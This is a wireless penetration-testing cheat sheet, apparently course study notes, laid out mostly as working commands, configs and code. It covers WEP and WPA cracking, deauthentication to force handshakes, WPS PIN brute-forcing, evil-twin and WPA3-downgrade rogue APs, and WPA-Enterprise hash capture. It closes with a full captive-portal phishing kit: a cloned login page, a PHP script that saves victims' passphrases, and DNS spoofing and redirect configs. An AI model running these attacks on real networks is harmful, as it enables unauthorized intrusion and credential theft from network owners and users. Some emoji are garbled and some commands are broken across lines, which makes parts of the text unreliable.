# üõ∞Ô∏è Offensive Security Wireless Pen-Testing Cheat Sheet

---

### A. Dependancies to look for

Packages that are needed on the OS for success:

```bash
sudo apt install reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
```

### B. Hardware Prep

**Detailed info about attached USBs**

`sudo lsusb -vv`

`iplink show`

`ifconfig`

`macchanger --show wlan0`

The iw utility and its variety of options is the only command we need for configuring a Wi-Fi device.

`sudo iw list`

**The rfkill Utility**

`sudo rfkill block all` [Block every type of radio]

`sudo rfkill list`[list and kill by radio designation]

## üì° 1. Preparation

```bash
# Enable monitor mode
airmon-ng check kill
airmon-ng start wlan0

# OR using iw
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

```bash
# Check interfaces
iwconfig
```

##### WireShark

Wireshark filter

`wlan.fc.type == 2`

###### Remote Packet Capture

`ssh root@10.11.0.196 "sudo -S tcpdump -U -w - -i wlan0mon" | sudo wireshark -k -i -`

---

## üîç 2. Discovery & Reconnaissance

```bash
# Scan for APs and clients
airodump-ng wlan0mon
# or
airodump-ng wlan0
# Airmon-ng does not provide any confirmation that monitor mode has been
# started on the specified channel. Running iw shows that the monitor mode 
# interface is listening on the desired channel and frequency.
sudo iw dev wlan0mon info
sudo airmon-ng --verbose

# stoping monitor mode
sudo airmon-ng stop wlan0mon
```

##### Airodump-ng

The options we will use most often are saving to a file, filtering
by BSSID, and capturing only on a specific channel.

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| -w prefix     | Saves the capture dump to the specified filename            |
| --bssid BSSID | Filters Airodump-ng to only capture the specified BSSID     |
| -c channel(s) | Forces Airodump-ng to only capture the specified channel(s) |

```bash
# Target specific BSSID and channel
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w 
./wireless_cap/testing_my_knowledge  
```

The table below contains descriptions of all of the Airodump-ng
fields in the top section, where APs are displayed.

| Field   | Description                                                                                                                                                                                                                                  |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| BSSID   | The MAC address of the AP                                                                                                                                                                                                                    |
| PWR     | The signal level reported by the card, which will get higher as we get closer to the AP or station                                                                                                                                           |
| RXQ     | Receive Quality as measured by the percentage of frames successfully received over the last 10 seconds                                                                                                                                       |
| Beacons | Number of announcement frames sent by the AP                                                                                                                                                                                                 |
| # Data  | Number of captured data packets (if WEP, this is the unique IV count), including data broadcast packets                                                                                                                                      |
| #/s     | Number of data packets per second measured over the last 10 seconds                                                                                                                                                                          |
| CH      | Channel number taken from beacon frames. Note that sometimes frames from other channels are captured due to overlapping channels                                                                                                             |
| MB      | Maximum speed supported by the AP. 11=802.11b, 22=802.11b+, up to 54 is 802.11g and anything higher is 802.11n or 802.11ac                                                                                                                   |
| ENC     | Encryption algorithm in use. OPN=no encryption, "WEP?"=WEP or higher<br> (not enough data to choose between WEP and WPA/WPA2), WEP=static or <br>dynamic WEP, and WPA or WPA2 if TKIP or CCMP is present. WPA3 and OWE <br>both require CCMP |
| CIPHER  | The cipher detected: CCMP, WRAP, TKIP, WEP, WEP40, or WEP104                                                                                                                                                                                 |
| AUTH    | The authentication protocol used. One of MGT (WPA/WPA2/WPA3 <br>Enterprise), SKA (WEP shared key), PSK (WPA/WPA2/WPA3 pre shared key), <br>or OPN (WEP open authentication)                                                                  |
| ESSID   | The so-called SSID, which can be empty if the SSID is hidden                                                                                                                                                                                 |

##### Airodump Output parameters

By default, executing airodump-ng with the -w option, followed by a filename prefix writes the output to a number of
formats:

- PCAP, with a cap extension.
- CSV, with a csv extension.
- Kismet legacy CSV, with a kismet.csv extension.
- Kismet legacy NetXML, with a kismet.netxml extension.
- Log CSV, with a log.csv extension.

Two additional files are created with certain options:

- GPS coordinates, with a gps extension when the -g option and a GPS device is configured. More details about this feature
  in a later section.
- Initialization Vector (IVS), with a .ivs extension with
  the --ivs option. In this case, only the IVS file will be
  created. This option is only useful for WEP cracking.

##### Airodump Interactive mode

`space` == pause

`tab` == interactive mode

`arrow up` `arrow down` == scrolling

`A` == display options

`S` == sorting options

`I` == Invert sorting

`D` == Default sort

---

## üèπ 3. WEP Attacks [Aireplay-ng]

| Attack # | Attack Name                          |
| -------- | ------------------------------------ |
| 0        | Deauthentication                     |
| 1        | Fake Authentication                  |
| 2        | Interactive Packet Replay            |
| 3        | ARP Request Replay Attack            |
| 4        | KoreK ChopChop Attack                |
| 5        | Fragmentation Attack                 |
| 6        | CafeÃÅ-Latte Attack                   |
| 7        | Client-Oriented Fragmentation Attack |
| 8        | WPA Migration Mode Attack            |
| 9        | Injection Test                       |

```bash
# Fake auth [this is to make sure that you can talk with the AP prior to 
# your attack]
aireplay-ng -1 0 -a <BSSID> -h <Your_MAC> wlan0mon

#Deauth
aireplay-ng -0 1 -a 6E:89:D4:EC:34:37 -c D6:58:91:1E:59:C5 wlan0

# ARP replay attack
aireplay-ng -3 -b <BSSID> -h <Your_MAC> wlan0mon
```

| Option    | Description                             |
| --------- | --------------------------------------- |
| -x nbpps  | Number of packets per second            |
| -p fctrl  | Set frame control word (hex)            |
| -a bssid  | Access point MAC address                |
| -c dmac   | Destination MAC address                 |
| -h smac   | Source MAC address                      |
| -e essid  | Target AP SSID                          |
| -j        | arpreplay attack: inject FromDS packets |
| -g value  | Change ring buffer size (default: 8)    |
| -k IP     | Destination IP in fragments             |
| -l IP     | Source IP in fragments                  |
| -o npckts | Number of packets per burst (-1)        |
| -q sec    | Seconds between keep-alives (-1)        |
| -y prga   | Keystream for shared key authentication |
| -B        | Bit rate test                           |
| -D        | Disable AP detection                    |
| -F        | Chooses first matching packet           |
| -R        | Disables /dev/rtc usage                 |

----

### üöÄ Aircrack-ng Performance-Boosting Options

üß† Pro Tip: Combine with More IVs

To speed up cracking further:

1. Use `aireplay-ng --arpreplay` to **inject ARP packets**.

2. Let `airodump-ng` collect 50k‚Äì200k IVs.

3. Run `aircrack-ng` with `-z` and `-f`.

| Option | Purpose                                  |
| ------ | ---------------------------------------- |
| `-z`   | Enables PTW attack (faster WEP cracking) |
| `-n`   | Specify key size (64, 128)               |
| `-f`   | Adjust brute-force fudge factor          |
| `-l`   | Save cracked key to file                 |

###### ‚úÖ `-z` ‚Äî PTW Attack Mode (Faster and Efficient)

```bash
aircrack-ng -z -b <BSSID> capture.cap

aircrack-ng -z -n 128 -f 3 -l result.txt -b 00:11:22:33:44:55 capture.cap
```

- Uses the **PTW (Pyshkin, Tews, Weinmann)** attack.

- Requires **fewer IVs** than traditional FMS/Korek attack.

- Works best with traffic from **ARP request replays** (`--arpreplay` from `aireplay-ng`).

**üìå Recommended for:**

- WEP 104/128-bit cracking.

- Fastest and most effective in practice.

---

###### ‚úÖ `-n` ‚Äî Specify Key Length (64, 128, 152, 256)

```bash
aircrack-ng -n 128 -b <BSSID> capture.cap
```

- Forces aircrack to focus on keys of a specific length.

- Default is 64 if unspecified.

- Helps narrow brute-force and accelerate cracking.

---

###### ‚úÖ `-f` ‚Äî Bruteforce Attack Speed

```bash
aircrack-ng -f 3 -b <BSSID> capture.cap
```

- Defines **brute-force fudge factor**.

- The higher the number, the **faster** (but more error-prone).

- Values: 1 (safe) to 4 (aggressive).

- Best used **only** when you're desperate to speed it up.

---

###### ‚úÖ `-k` ‚Äî Disable Brute-Force (PTW Only)

```bash
aircrack-ng -z -k -b <BSSID> capture.cap
```

- Skips final brute-force verification.

- Significantly faster if you're capturing just to **identify weak keys quickly**.

---

###### ‚úÖ `-l` ‚Äî Log Cracked Key to File

```bash
aircrack-ng -l cracked_key.txt capture.cap
```

- Logs any cracked key to a file (good for automation or multiple runs).

---



## üîì 4. WPA/WPA2 Handshake Capture

While performing the WEP attack capture must be running. 

```bash
# Capture WPA handshake in pcap
airodump-ng -c <channel> --bssid <BSSID> -w handshake wlan0mon
airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w ./wireless_cap/testing_my_knowledge  

# Deauth clients to force handshake [Note this is to target the AP]
aireplay-ng -0 10 -a <BSSID> wlan0mon

# Deauth clients to force handshake [Note this is to target the Devices connecting to the AP]
aireplay-ng -0 1 -a 6E:89:D4:EC:34:37 -c D6:58:91:1E:59:C5 wlan0
```

---

### Crack WPA/WPA2 (PSK)

```bash
# Aircrack with wordlist and John
aircrack-ng -w <wordlist.txt> -b <BSSID> handshake.cap

aircrack-ng -w /usr/share/john/password.lst -e wifu
-b 34:08:04:09:3D:38 wpa-01.cap
```

How to confirm that the password is correct:

`-b` == BSSID

`-e` == ESSID

`-p` == cracked password you want to confirm

example:

`airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap`

### Kali Linux Word Lists

```bash
/usr/share/wordlists
```

### Aircrack-ng and John

```bash
#John password file location
/usr/share/john/password.lst

#The JtR mangling rules are located
 /etc/john/john.conf

#Chaning JtR rules can be as simple as 
sudo nano /etc/john/john.conf
# Add two numbers to the end of each password
$[0-9]$[0-9]
$[0-9]$[0-9]$[0-9]

#have your new custom wordlist output for use with aircrack-ng
john --wordlist=/usr/share/john/password.lst --rules --stdout 
| aircrack-ng -e wifu -w - ~/wpa-01.cap
```

---

### Aircrack-ng troubleshooting

 **1. No Matching Handshake in the Capture File**

- If the `.cap` file doesn't contain a **complete 4-way WPA handshake**, `aircrack-ng` won‚Äôt be able to verify any password.

- Run this to verify:

- `aircrack-ng captureHorse.cap-01.cap`
  
  **2. Password Is Not in the Generated Wordlist**
  
  **3. Pipe May Be Too Fast (Race Condition)**

```bash
crunch 11 11 -t Juniper%%%^ -o wordlist.txt
aircrack-ng -w wordlist.txt -e Hodept-working-horse captureHorse.cap-01.cap
```

---

### Aircrack-ng and Crunch

```bash
Crunch also allows us to specify a pattern with the -t option with or
 without a character set. Different symbols in the pattern define the
 type of character to use.
Cruch requires only minimum length and maximum length of the password.

crunch _min_ _max_ options 
    @ represents lowercase characters or characters from a defined set
    , represents uppercase characters
    % represent numbers
    ^ represents symbols

#How to fill in for possible missing characters. 
crunch 11 11 -t password%%%
# or 
crunch 11 11 0123456789 -t password@@@

# The -p option generates unique words from a character set or a set of 
# whole words. 
crunch 1 1 -p dog cat bird
# this creates all of the different variations of bird, dog, and cat together
# as a single password

#you can combine generation and words by doing the following
crunch 5 5 -t ddd%% -p dog cat bird
crunch 5 5 aADE -t ddd@@ -p dog cat bird

#Now we can pipe the data from crunch into aircrack-ng
crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap 
-w -
```

### Aircrack-ng and rsmangler

```bash
# RSMangler can create a giant wordlist for password cracking 
# that can either be piped to other tools or saved to a file.

Steps:

1. create new wordlist file with individual words line seperated
2. point rsmangler to the file 

rsmangler --file wordlist.txt
rsmangler --file wordlist.txt --output mangled.txt [output the new RS file]

3. Using --min and --max options, we limit the length of the
   RSMangler words

4. Point RSmangler to aircrack-ng

rsmangler --file wordlist.txt --min 12 --max 13 
| aircrack-ng -e wifu rsmangler-01.cap -w -
```

------

### Checking your password aginst a pcap

```bash
airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap

airdecap-ng -b 76:5C:7F:17:C6:26 -e Hodept-working-horse -p Juniper5968265$ working-01.cap 
```

If you were distrupted while performing the capture, you can also attempt to check your attack via Wireshark:
`wireshark example.cap`
`edit > preferences > protocols > 802.11 > keys`

After entering the key you should see that the packets are then decrypted and viewable as they were not before. 

---

### WPA/WPA2 PMKID Attack [Using Hashcat]

```bash
# Crack with hashcat
hashcat -m 2500 handshake.hccapx wordlist.txt

hashcat -m 2500 --deprecated-check-disable output.hccapx
 /usr/share/john/password.lst

hashcat -a 0 -m  22000  hash.hc22000 /usr/share/john/password.lst


# Convert .cap to .hccapx for hashcat
cap2hccapx handshake.cap handshake.hccapx
```

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o pmkid.16800 -E essidlist.txt dump.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.16800 wordlist.txt
```

---

## üß™ 5. WPS Attacks [EAP messages]

The WPS process securely transmits the WPA or WPA2 passphrase over
wireless using EAP messages

```bash
# WPS scan
wash -i wlan0mon

# Reaver WPS attack
reaver -i wlan0mon -b <BSSID> -c <channel> -vv
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv

# Pixie Dust attack (if vulnerable)
reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv -K
```

```bash
Wash v1.6.6 WiFi Protected Setup Scan Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner

Required Arguments:
        -i, --interface=<iface>              Interface to capture packets on
        -f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files

Optional Arguments:
        -c, --channel=<num>                  Channel to listen on [auto]
        -n, --probes=<num>                   Maximum number of probes to send to each AP in scan mode [15]
        -O, --output-file=<filename>         Write packets of interest into pcap file
        -F, --ignore-fcs                     Ignore frame checksum errors
        -2, --2ghz                           Use 2.4GHz 802.11 channels
        -5, --5ghz                           Use 5GHz 802.11 channels
        -s, --scan                           Use scan mode
        -u, --survey                         Use survey mode [default]
        -a, --all                            Show all APs, even those without WPS
        -j, --json                           print extended WPS info as json
        -U, --utf8                           Show UTF8 ESSID (does not sanitize ESSID, dangerous)
        -p, --progress                       Show percentage of crack progress
        -h, --help                           Show help

Example:
        wash -i wlan0mon
```

Using Known_Pins to try and assist when looking at a specific vendor

```bash
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db

#knowing if there is a pin you are looking for try searching for part of
#the pin
echo ${PINDB["0013F7"]}

#then use this in reaver using steps for known pin 
```

#### üß† If You Know Half the PIN

Depending on **which half** you know, the strategy changes:

---

##### üîç Option 1: You Know the **First Half** (e.g., `1234xxxx`)

Reaver supports manually specifying the first half to **skip bruteforcing it**.

`reaver -i wlan0mon -b <BSSID> -c <channel> -p 1234 -vv`

- `-p 1234`: First half of PIN provided, Reaver will brute-force only the second half.

- MUCH faster than full brute-force.

- Reaver will still compute the checksum automatically.

##### üîç Option 2: You Know the **Second Half** (e.g., `xxxx5670`)

This is trickier ‚Äî Reaver **only supports fixing the first half** via `-p`.

But here's what you can do:

1. Try combining a fixed first half guess with your known second half (full 8-digit PIN).

2. Use the full PIN in `-p`:
   
   * `reaver -i wlan0mon -b <BSSID> -c <channel> -p 12345670 -vv`

3. If you know the **entire PIN** already (minus the checksum), you can calculate the checksum or try combinations.

4. To calculate the checksum:
   Python snippet:

5. ```python
   def wps_checksum(pin):
       accum = 0
       while pin:
           accum += 3 * (pin % 10)
           pin //= 10
           accum += pin % 10
           pin //= 10
       return (10 - accum % 10) % 10
   
   pin7 = 1234567
   checksum = wps_checksum(pin7)
   print(f"WPS PIN: {pin7}{checksum}")
   ```

‚ö° Speeding It Up with Pixie Dust

If the target is vulnerable to the **Pixie Dust attack** (static PIN generation), you can force Reaver to try Pixie:

`reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv`

---

## üì∂ 6. Rogue AP / Evil Twin WPA2 [Downgrading from WPA3 OR WPA2/Enterprise Attacks]

###### First gather information about the AP you wish to mimic:

```bash

    ESSID 
    BSSID of FC:7A:2B:88:63:EF
    WPA (TKIP/CCMP) and WPA2 (TKIP/CCMP)
    PSK
    channel 1
#Information such as this can be determined from a PCAP

#Ensure that the tool is installed 
sudo apt install hostapd-mana
```

#### Create a hostapd mana config

Create a `hostapd.conf` file:

###### WPA2 ONLY

```bash
#WPA2 EXAMPLE
#example Hostapd-mana config
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx
```

###### WPA3 Only

At the writing of this module, it is not possible to crack WPA3.
However, when we encounter APs with WPA3, we may be able to trick
clients into downgrading to a WPA2 connection, allowing us to capture
a crackable handshake. We can accomplish this by creating an AP with
only WPA2 and 802.11w set to "optional". WPA3 use the same algorithms
as WPA2 CCMP, and requires 802.11w.

If 802.11w is disabled, a client may never try to connect, but
WPA2 clients rarely use it (and sometimes don't handle it well).
The combination of only using WPA2 and 802.11w set to "optional"
will gives us the highest chance that a client will be willing to
downgrade.

To achieve this in the hostapd configuration, the *wpa* value should
be set to "2", there shouldn't be a *wpa_pairwise* parameter, and *rsn_pairwise* should be set to "CCMP" only. To enable 802.11w,
we would set *ieee80211w* as a new parameter with the value of
"1" (indicating it is optional). This also requires that we add
"WPA-PSK-SHA256" to *wpa_key_mgmt*.

```bash
#WPA3 EXAMPLE
#example Hostapd-mana config
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=CCMP
mana_wpaout=/home/kali/mostar.hccapx

```

```bash
hostapd -B hostapd.conf
```

```bash
#capture your handshakes and crack them
#deauth as needed to deauth devices that are trying to connect to your mimiced AP name
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon

#once you have handshakes use john to crack like you would normally
aircrack-ng FluffyChicken.hccapx -e Chicken -w /usr/share/john/password.lst
```



### üîê WPA-Enterprise (802.1X / PEAP / MSCHAPv2)

- WPA-Enterprise attacks don‚Äôt yield pre-shared keys like WPA2-PSK.
- These attacks rely on **social engineering + rogue APs**.
- Success depends on users connecting and entering credentials.
- Certificate warnings can tip off users.

> **Objective**: Set up a rogue AP, force a client to connect, capture MSCHAPv2 hashes, and crack them.
> 
> The AUTH column shows the AP
> has an authentication type of **MGT**, meaning WPA Enterprise.

CMD to check cert timeouts.

`openssl x509 -in CERT_FILENAME -noout -enddate`

---

#### Steps

1. Pcap to capture certificate

2. Deauth client

3. open the capture file with *Wireshark* and locate the server certificate frame
   
   1. **tls.handshake.type == 11** or **tls.handshake.certificate**
   
   2. open *Extensible Authentication Protocol* > *Transport Layer Security*. We now have
      to open the **TLSv1 Record Layer: Handshake Protocol: Certificate** (or similar, as the TLS version will vary). Once there, we will
      have to expand **Handshake Protocol: Certificate** item, then **Certificates** (plural). Inside **Certificates**, we can see one or
      more entries named **Certificate**. Each of them will be preceded by
      the length. For each certificate, we right click and select *Export
      Packet Bytes* to save the data into a file with a .der extension
   
   3. Read each file and or Convert to a PEM file.
      
      1. `openssl x509 -inform der -in CERTIFICATE_FILENAME-text`
      
      2. `openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt`

4. Install radius server `sudo apt install freeradius`

5. As a root user, we'll need to navigate to /etc/freeradius/3.0/certs and change the settings of ca.cnf. We edit the **[certificate_authority]** fields to
   match our target CA certificate to appear less suspicious to clients
   in case they inspect the certificate.
   
   1. `cd /etc/freeradius/3.0/certs`
   
   2. `vi ./ca.cnf`
   
   3. now change server conf `vi server.cnf`

6. Now nuke the Diffie-Hellman
   
   1. `rm dh`
   
   2. `make`
      
      1. Ignore any client side errors as that conf file was not touched.

### Using hostapd-wpe for WPA/Enterprise Attacks

#### 1. Install hostapd-mana

```bash
apt install hostapd-mana
```

---

#### 2. Configure hostapd-wpe

Edit the config (`/etc/hostapd-mana/mana.conf`):

```conf
interface=wlan0
ssid=CorpWiFi
channel=6
driver=nl80211
logger_stdout=-1
logger_stdout_level=2
ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=secret
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user
```

---

#### 3. Start Rogue AP

```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Wait for a client to connect. You'll see captured **MSCHAPv2** challenge/response hashes in `/var/www/html/`.

---

##### üì¶ Example Output

```text
USERNAME: alice
CHALLENGE: xxxxxxxxxxxxx
RESPONSE: yyyyyyyyyyyyy
```

---

#### 4. Crack with asleap

```bash
asleap -C <CHALLENGE> -R <RESPONSE> -W wordlist.txt
```

Or use hashcat:

```bash
# Format for hashcat -m 5500 (MSCHAPv2)
<username>::<domain>:<challenge>:<response>:unused

# Run with hashcat
hashcat -m 5500 hash.txt wordlist.txt
```

---

#### 5. üõ† Alternative: Using Eaphammer

```bash
apt install eaphammer

# Simple rogue AP attack
eaphammer --interface wlan0 --essid CorpWiFi --creds

# With deauth
eaphammer --interface wlan0 --essid CorpWiFi --channel 6 --deauth --creds
```

Captured credentials appear in `/var/lib/eaphammer/`.

---

#### 6. üîê Cracking Captured Hashes with Hashcat

```bash
hashcat -m 5500 hash.txt rockyou.txt
hashcat -m 5500 hash.txt rockyou.txt --show
```

---

---

## üßº 7. Captive Portal Attacks

### Step 1: Identify your target.

**<u>*NOT</u>E***: PHP scripts can save credentials that a user enters, and then we'll redirect the user to a success or failure page.

```bash
#Intercept a handshake from one of the clients

sudo airodump-ng -w discovery --output-format pcap wlan0mon

#Deauth as needed
sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon

#use something as a base for your attack [wget and save locally]
wget -r -l2 [https://www.abc123!@%^.com]
```

#### Configure `hostapd` to Create the Fake AP

1. Install Apache which will be our web server. ¬†
   
   1. `sudo apt install apache2 libapache2-mod-php`

2.  Scrape the page of a site you wish to copy 
   
   1. `wget -r -l2 https://www.megacorpone.com`
      
      1. Move these into `/var/www/html/portal` since they contain the CSS and the background image

### Step 2: Set Up Apache to Host the Captive Portal

Let's create our captive portal login page, called index.php in /var/www/html/portal

##### Create a Fake Captive Portal Page:

1. ```bash
   nano /var/www/html/portal/index.php
   ```
   
   Example HTML:
   
   ```php
   <!DOCTYPE html>
   <html lang="en">
   
       <head>
           <link href="assets/css/style.css" rel="stylesheet">
           <title>MegaCorp One - Nanotechnology Is the Future</title>
       </head>
       <body style="background-color:#000000;">
           <div class="navbar navbar-default navbar-fixed-top" role="navigation">
               <div class="container">
                   <div class="navbar-header">
                       <a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
                   </div>
               </div>
           </div>
   
           <div id="headerwrap" class="old-bd">
               <div class="row centered">
                   <div class="col-lg-8 col-lg-offset-2">
                       <?php
                           if (isset($_GET["success"])) {
                               echo '<h3>Login successful</h3>';
                               echo '<h3>You may close this page</h3>';
                           } else {
                               if (isset($_GET["failure"])) {
                                   echo '<h3>Invalid network key, try again</h3><br/><br/>';
                               }
                       ?>
                   <h3>Enter network key</h3><br/><br/>
                   <form action="login_check.php" method="post">
                       <input type="password" id="passphrase" name="passphrase"><br/><br/>
                       <input type="submit" value="Connect"/>
                   </form>
                   <?php
                           }
                   ?>
                   </div>
   
                   <div class="col-lg-4 col-lg-offset-4 himg ">
                       <i class="fa fa-cog" aria-hidden="true"></i>
                   </div>
               </div>
           </div>
   
       </body>
   </html>
   ```

2. **Capture credentials** with a simple PHP logger:
   
   `/var/www/html/portal/login_check.php`:
   
   ```php
   <?php
   # Path of the handshake PCAP THIS IS IMPORTANT to confirm if the handshake is correct or not! 
   $handshake_path = '/home/kali/CHANGE_ME';
   # ESSID
   $essid = 'CHANGE_ME_HUMAN_READABLE_ESSID';
   # Path where a successful passphrase will be written
   # Apache2's user must have write permissions
   # For anything under /tmp, it's actually under a subdirectory
   #  in /tmp due to Systemd PrivateTmp feature:
   #  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
   # See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
   $success_path = '/tmp/passphrase.txt';
   # Passphrase entered by the user
   $passphrase = $_POST['passphrase'];
   
   # Make sure passphrase exists and
   # is within passphrase lenght limits (8-63 chars)
   if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
     header('Location: index.php?failure');
     die();
   }
   
   # Check if the correct passphrase has been found already ...
   $correct_pass = file_get_contents($success_path);
   if ($correct_pass !== FALSE) {
   
     # .. and if it matches the current one,
     # then redirect the client accordingly
     if ($correct_pass == $passphrase) {
       header('Location: index.php?success');
     } else {
       header('Location: index.php?failure');
     }
     die();
   }
   
   # Add passphrase to wordlist ...
   $wordlist_path = tempnam('/tmp', 'wordlist');
   $wordlist_file = fopen($wordlist_path, "w");
   fwrite($wordlist_file, $passphrase);
   fclose($wordlist_file);
   
   # ... then crack the PCAP with it to see if it matches
   # If ESSID contains single quotes, they need escaping
   exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
   " -w " . $wordlist_path . " " . $handshake_path, $output, $retval);
   
   $key_found = FALSE;
   # If the exit value is 0, aircrack-ng successfully ran
   # We'll now have to inspect output and search for
   # "KEY FOUND" to confirm the passphrase was correct
   if ($retval == 0) {
   	foreach($output as $line) {
   		if (strpos($line, "KEY FOUND") !== FALSE) {
   			$key_found = TRUE;
   			break;
   		}
   	}
   }
   
   if ($key_found) {
   
     # Save the passphrase and redirect the user to the success page
     @rename($wordlist_path, $success_path);
   
     header('Location: index.php?success');
   } else {
     # Delete temporary file and redirect user back to login page
     @unlink($wordlist_file);
   
     header('Location: index.php?failure');
   }
   ?>
   ```

---

### Step 3: Network Set up for Captive Portal

```bash
#Assign a non-conflicting address range to your NIC
sudo ip addr add 192.168.87.1/24 dev wlan0
# Turn interface on
sudo ip link set wlan0 up
```

----

### Step 4: Set Up `dnsmasq` for DHCP + DNS Spoofing

Create `dnsmasq.conf`:

```conf
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```

Run it:

This gives users IPs and redirects all DNS queries to your portal server.

```bash
dnsmasq -C dnsmasq.conf

# if you experience issues:
# find and kill the process when we are done. We can inspect syslog4 to confirm it started successfully.
sudo tail /var/log/syslog | grep dnsmasq
# or
/etc/init.d/dnsmasq restart\

# Confirm functionality 
sudo netstat -lnp



```



---

### Step 4: Redirect Users to the Captive Portal Automatically

Sometimes clients ignore DNS settings provided in the DHCP lease,
and we will use an nftables rule to force redirect
all DNS requests (UDP to port 53 only--TCP port 53 is for *zone
transfer back to our server).

To do this, we need to install nftables and then add the rules.

```bash
sudo apt install nftables

sudo nft add table ip nat

sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'

sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

---

### Step 5:  Configure Apache to work

In Apache's site configuration, we need to add *mod_rewrite and *mod_alias* rules so that the captive portal is set properly. We'll add the following lines in `/etc/apache2/sites-enabled/000-default.conf` before the *VirtualHost* closing tag.

```apacheconf
...

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```

These additions will require two modules to be enabled. For the first four and the last three instructions, we need the *redirect* module. For the two "RedirectMatch" additions in-between, we need the *alias* module.

`sudo a2enmod rewrite`

`sudo a2enmod alias`

###### Special Case for Chrome

With just HTTP in our Apache configuration, we will fail to connect to the website because the port isn't listening.

We can remedy this special case by making a HTTPS section in Apache.
Note that doing so will break Firefox (and possibly other OS/software)
if the victim clicks on the prompt to guide them to the captive
portal. This is because of the self-signed certificate. It should
work when the OS opens Firefox to log in. For these reasons, we only
recommended this approach in an environment where only Chrome is used.

To do this, we will need to duplicate the whole *VirtualHost* section in the same site file, `/etc/apache2/sites-enabled/000-default.conf`. We will change
port 80 to 443 in the *VirtualHost* tag, the instances of *http* to *https* in the *RewriteRule* and *RedirectMatch* statements, and finally we will add a SSL certificate.

```
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```

